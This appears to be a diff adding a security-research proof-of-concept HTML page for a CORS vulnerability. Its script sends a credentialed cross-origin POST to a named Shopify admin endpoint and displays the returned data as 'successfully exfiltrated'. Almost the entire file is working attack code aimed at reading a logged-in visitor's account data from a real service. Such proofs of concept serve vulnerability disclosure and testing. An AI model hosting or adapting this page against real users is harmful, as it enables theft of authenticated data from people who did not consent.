@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>Security Research - CORS Vulnerability Proof of Concept</h1>
+    <hr>
+    <div id="status">Status: Attempting to retrieve data...</div>
+    <pre id="output" style="background-color: #f4f4f4; padding: 15px; border: 1px solid #ddd; margin-top: 20px;"></pre>
+
+    <script>
+        const targetUrl = 'https://admin.shopify.com/.well-known/dux';
+        const payload = {
+            "pb": "geo",
+            "enableActiveConsent": true,
+            "protoSessionAppType": "merchant",
+            "enableOptOutSaleOfData": true
+        };
+
+        fetch(targetUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload),
+            credentials: 'include'
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            document.getElementById('status').innerText = "Status: Data successfully exfiltrated!";
+            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+            console.log('Exfiltrated Data:', data);
+        })
+        .catch(error => {
+            document.getElementById('status').innerText = "Status: Request failed or blocked by CORS.";
+            document.getElementById('output').innerText = error.message;
+        });
+    </script>
+</body>
+</html>
